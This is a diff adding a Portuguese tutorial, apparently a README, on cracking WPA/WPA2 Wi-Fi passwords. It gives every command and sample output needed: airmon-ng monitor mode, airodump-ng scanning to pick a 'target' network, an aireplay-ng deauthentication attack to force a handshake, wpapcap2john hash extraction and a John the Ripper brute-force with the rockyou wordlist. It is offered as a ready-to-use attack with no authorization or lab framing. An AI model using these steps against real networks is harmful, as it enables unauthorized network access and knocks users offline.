@@ -7,4 +7,158 @@
 4 - a tool hcxtools (opcional)
 
 # Primeiro passo: 
-verificar se seu chipset suporta os modos citados acima ataque ...
+verificar se seu chipset suporta os modos citados acima ataque.
+
+
+$ iwlist (mostra informações sobre a interface/placa de rede)
+
+ou
+
+$ sudo airmon-ng 
+Mostrara o nome da interface e o chipset, depois pesquisar para saber os modos que chipset suporta.
+A saida será parecida com essa:
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+
+
+($ ifconfig ou $ iwconfig para ver o nome do internace)
+
+
+
+# Segundo passo:
+Colocar seu interface em monitor mode
+
+$ sudo airmon-ng check kill 
+Mata porcessos que interferem no modo mon.
+
+A saida será parecida com essa:
+
+Killing these processes:
+
+  PID Name
+  870 dhclient
+ 1115 wpa_supplicant
+
+
+Depois "starta" a interface
+
+$ sudo airmon-ng start <interface> 
+
+A saida será parecida com essa:
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlan0mon	ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+		(mac80211 station mode vif enabled on [phy0]wlan0)
+		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)
+    
+    
+($ ifconfig ou $ iwconfig para confirmar que a interface esta em monitor-mode)
+
+
+# Terceiro passo
+"Sniffar" redes em volta para identificar seu alvo
+
+$ sudo airodump-ng <interface>
+
+A saida sera parecida com essa:
+
+ CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
+                                                                                                            
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                            
+ 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         
+ 00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear 
+ 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy                             
+                                                                                                            
+ BSSID              STATION            PWR   Rate   Lost  Packets  Notes  Probes
+                                
+ 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14
+ (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
+ 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
+ 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy
+ 
+ ####################################
+ BSSID = Mac Address do AP (roteador)
+ ESSID = nome que identifica o AP
+ CH = canal em que o AP esta operando
+ STATION = Mac Address de dispositivos conectados aos APs
+ ####################################
+ 
+ # Quarto passo
+ Depois de identificar o alvo, começar o captura dos pacotes da rede para então pegar o HANDSHAKE
+ 
+ $ sudo airodump-ng --bssid <macaddr> --channel <canal> -w <arquivo> <interface>
+ (--channel para evitar perda de pacotes,  -w para gravar captura em um arquivo)
+ 
+ 
+ 
+ # Quinto passo
+ Enquanto é capturado o trafego do alvo, devera ser feito um ataque de Deauthentication
+ para um dispositivo que esta conectado ao AP ser desconectado. Em seguida o dispositivo ira
+ se conectar novamente. E é nessa hora que o HANDSHAKE é capturado...
+ 
+ Para desautenticar uma STATION de um AP sera usado o aireplay-ng:
+ 
+ $ aireplay -0 1 -a <macAP> -c <macSTATION> <interface>
+ (-0 especifica o Deauthentication attack,   1 é o número de deauths a serem enviados,   -a mac do roteador alvo,   -c mac do dispositivo cliente para desautenticar) #Obs: mandar poucos deauths porque pode influenciar na captura do trafego
+ 
+ A saida sera parecida com essa:
+ 12:35:25  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
+ 12:35:25  Sending 64 directed DeAuth. STMAC: [00:0F:B5:AE:CE:9D] [ 61|63 ACKs]
+ 
+ ##########
+ [ ACKs recebidos da STATION | ACKs recebidos do AP]
+ ##########
+ 
+ 
+ 
+ # Sexto passo
+ Se der certo o Quinto passo, na terminal do airodump-ng capturando os pacotes
+ ira aparecer a seguinte mensagem [ WPA handshake: 00:14:6C:7E:40:80
+ 
+ Exemplo: CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80
+                                                                                                            
+          BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                            
+          00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN              NETGEAR                         
+          00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP         bigbear 
+          00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy       
+ 
+ 
+ # Se você verifcar o diretorio atual, vera alguns arquivos incluindo a captura do trafego( arquivo.cap)
+ 
+ 
+ 
+ # Setimo passo
+ Depois do HANDSHAKE capturado há algumas formas de extrair só a parte que interessa.
+ Uma delas é com uma ferramenta WPAPCAP2JOHN do pacote John The Ripper.
+ 
+ $ wpapcap2john -v arquivo.cap
+ Ira analizar o .cap procurando pelo handshake 
+ 
+ <colocar exemplo da saido do comando>
+ 
+ # Caso o handshake foi capturado corretamente a ferramenta wpapcap2john 
+   pode converter um hash do arquivo .cap, para ser feito um ataque de brute-force offline...
+   
+ $ wpapcap2john > <arquivo de saida> 
+ 
+ No arquivo ficara um hash dessa forma: 
+ ESSID:$WPAPSK$ESSID#x3EU5Y3o1jRkE5hTM0qamIqSFyApa7cBSX5AZFNCidtAkKPdtQ1uyW2Hv1z8s4BrRP7aFIZy19Jsvy9hMhX5O8FRp2P1UaDjQ8MpZE21.5I0.Ec.............M0qamIqSFyApa7cBSX5AZFNCidtAkKPdtQ1uyW2Hv1w.................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U...5Imr/ewzRUT2b9IE63q1mc:0ef770407b5f:f454201e4174:f454201e4174::WPA2, verified:arquivo.cap
+ 
+ 
+
+# Oitavo passo (não pensei que teria tantos passos :) ) 
+Com o hash em mãos é só fazer o brute-force 
+(o exemplo sera com John The Ripper porque gosto mais dele do que o Hashcat)
+
+$ john hash.txt --wordlist=rockyou.txt --format=wpapsk
+
+Nota: se for uma senha forte e grande esse ataque é inviável.
+      Em caso de duvidas... 
+      não vou deixar nenhuma forma de contato, sinto mutio, então boa sorte ;)
+
+ 
